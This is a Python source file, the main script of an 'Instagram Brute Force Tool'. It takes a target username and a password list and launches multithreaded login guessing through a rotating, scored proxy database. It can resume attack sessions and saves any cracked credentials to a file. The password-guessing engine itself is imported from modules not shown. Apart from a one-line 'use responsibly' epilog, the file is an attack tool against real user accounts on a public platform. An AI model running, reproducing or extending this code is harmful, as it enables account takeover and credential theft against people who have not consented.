#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Instagram Brute Force Tool
Author: hSECURITIES
Date: 2018-12-29
"""

import os
import sys
import time
from argparse import ArgumentParser, ArgumentTypeError
from platform import python_version

from lib import database
from lib.bruter import Bruter
from lib.display import Display
from lib.proxy_manager import ProxyManager
from lib.const import credentials, modes

class InstagramBruteForcer:
    """Main Instagram Brute Force Engine"""

    def __init__(self, username: str, threads: int, passlist_path: str, use_color: bool):
        self.resume = False
        self.is_alive = True
        self.username = username
        self.threads = threads
        self.passlist_path = passlist_path
        self.display = Display(use_color=use_color)
        self.bruter = Bruter(username, threads, passlist_path)

    def get_user_response(self) -> str:
        """Get user response for resuming attack"""
        try:
            return self.display.prompt("Would you like to resume the attack? [y/N]: ")
        except Exception as e:
            self.display.show_error(f"Error getting user input: {e}")
            self.is_alive = False
            return ""

    def save_credentials(self, password: str) -> None:
        """Save found credentials to file"""
        try:
            with open(credentials, "a", encoding="utf-8") as file:
                data = f"Username: {self.username}\nPassword: {password}\n\n"
                file.write(data)
        except IOError as e:
            self.display.show_error(f"Error saving credentials: {e}")

    def start(self) -> None:
        """Start the brute force attack"""
        while self.is_alive and not self.bruter.password_manager.session:
            time.sleep(0.1)  # Reduce CPU usage while waiting

        if not self.is_alive:
            return

        if self.bruter.password_manager.session.exists:
            response = self.get_user_response()
            if response.strip().lower() == "y" and self.is_alive:
                self.bruter.password_manager.resume = True

        try:
            self.bruter.start()
        except KeyboardInterrupt:
            self.stop()
            self.bruter.display.shutdown(
                self.bruter.last_password,
                self.bruter.password_manager.attempts,
                len(self.bruter.browsers)
            )
        except Exception as e:
            self.display.show_error(f"Error during brute force: {e}")
            self.stop()

    def stop(self) -> None:
        """Stop the brute force attack"""
        if self.is_alive:
            self.bruter.stop()
            self.is_alive = False

            if (self.bruter.password_manager.is_read and
                not self.bruter.is_found and
                not self.bruter.password_manager.list_size):
                self.bruter.display.stats_not_found(
                    self.bruter.last_password,
                    self.bruter.password_manager.attempts,
                    len(self.bruter.browsers)
                )

            if self.bruter.is_found:
                self.save_credentials(self.bruter.password)
                self.bruter.display.stats_found(
                    self.bruter.password,
                    self.bruter.password_manager.attempts,
                    len(self.bruter.browsers)
                )

def validate_mode(value: str) -> int:
    """Validate mode input"""
    try:
        mode = int(value)
        if mode < 0 or mode > 3:
            raise ArgumentTypeError("Mode must be between 0 and 3")
        return mode
    except ValueError:
        raise ArgumentTypeError("Mode must be a number")

def validate_prune_value(value: str) -> float:
    """Validate prune value input"""
    try:
        prune = float(value)
        if prune < 0 or prune > 1:
            raise ArgumentTypeError("Prune must be a value between 0 and 1")
        return prune
    except ValueError:
        raise ArgumentTypeError("Prune must be a number")

def setup_argument_parser() -> ArgumentParser:
    """Set up command line argument parser"""
    parser = ArgumentParser(
        description="Instagram Brute Force Tool by hSECURITIES",
        epilog="Use responsibly and only on systems you own or have permission to test."
    )

    parser.add_argument("-u", "--username", help="Target username or email")
    parser.add_argument("-p", "--passlist", help="Path to password list file")
    parser.add_argument("-px", "--proxylist", help="Path to proxy list file")
    parser.add_argument("--prune", default=-1, type=validate_prune_value,
                      help="Prune the database (0.0-1.0)")
    parser.add_argument("--stats", action="store_true",
                      help="Display proxy database statistics")
    parser.add_argument("-nc", "--no-color", dest="color", action="store_true",
                      help="Disable colored output")
    parser.add_argument("-m", "--mode", default=2, type=validate_mode,
                      help="Performance mode (0-3): 0=32 bots, 1=16 bots, 2=8 bots, 3=4 bots")

    return parser

def prune_proxy_database(prune_value: float) -> None:
    """Prune low-quality proxies from the database"""
    threshold = prune_value * 100
    if input("Are you sure you want to prune the database of proxies? [y/N]: ").lower() == "y":
        print(f"\n<<< Pruning proxies with score ≤ {threshold:.2f}% >>>")
        time.sleep(0.5)

        pruned_count = database.Proxy().prune(prune_value)
        print(f"Successfully pruned {pruned_count} proxies from the database")
        time.sleep(0.5)
    else:
        print("Pruning operation cancelled")

def show_database_statistics() -> None:
    """Display statistics about the proxy database"""
    stats = database.Proxy().stats()
    precision = 5

    formatted_stats = {
        "total": stats["total"],
        "q1": round(stats["q1"], precision),
        "average": round(stats["avg"], precision),
        "minimum": round(stats["min"], precision),
        "maximum": round(stats["max"], precision)
    }

    health_status = (
        "Dead" if formatted_stats["average"] == 0 else
        "Very Ill" if formatted_stats["average"] <= 0.1 else
        "Ill" if formatted_stats["average"] <= 0.3 else
        "Unhealthy" if formatted_stats["average"] <= 0.5 else
        "Fair" if formatted_stats["average"] <= 0.7 else
        "Healthy" if formatted_stats["average"] <= 0.9 else
        "Excellent"
    )

    print("\nProxy Database Statistics:")
    print(f"Total Proxies: {formatted_stats['total']}")
    print(f"Database Health: {health_status}")
    print(f"Q1 Score: {formatted_stats['q1']}")
    print(f"Average Score: {formatted_stats['average']}")
    print(f"Minimum Score: {formatted_stats['minimum']}")
    print(f"Maximum Score: {formatted_stats['maximum']}")
    time.sleep(0.5)

def main() -> None:
    """Main program execution"""
    if int(python_version()[0]) < 3:
        print("[!] This program requires Python 3 or higher", file=sys.stderr)
        sys.exit(1)

    parser = setup_argument_parser()
    args = parser.parse_args()

    if args.prune > 0 or args.stats:
        if args.prune > 0:
            prune_proxy_database(args.prune)
        if args.stats:
            show_database_statistics()
    else:
        if args.proxylist:
            if not os.path.exists(args.proxylist):
                print(f"Error: Proxy list file not found at {args.proxylist}", file=sys.stderr)
                sys.exit(1)

            print("\n<<< Updating proxy database >>>")
            time.sleep(0.5)
            proxy_manager = ProxyManager()
            proxies_added = proxy_manager.write2db(args.proxylist)
            print(f"Added {proxies_added} proxies to the database")
            time.sleep(0.5)

        total_proxies = len(database.Proxy().get_proxies())

        if args.username and args.passlist and total_proxies > 0:
            if not os.path.exists(args.passlist):
                print(f"Error: Password list file not found at {args.passlist}", file=sys.stderr)
                sys.exit(1)

            print("\nStarting brute force attack...")
            brute_forcer = InstagramBruteForcer(
                username=args.username,
                threads=modes[args.mode],
                passlist_path=args.passlist,
                use_color=not args.color
            )
            brute_forcer.start()
        else:
            if not args.proxylist or total_proxies == 0:
                print("Error: No proxies available in database", file=sys.stderr)
                parser.print_help()
                sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Fatal error: {e}", file=sys.stderr)
        sys.exit(1)
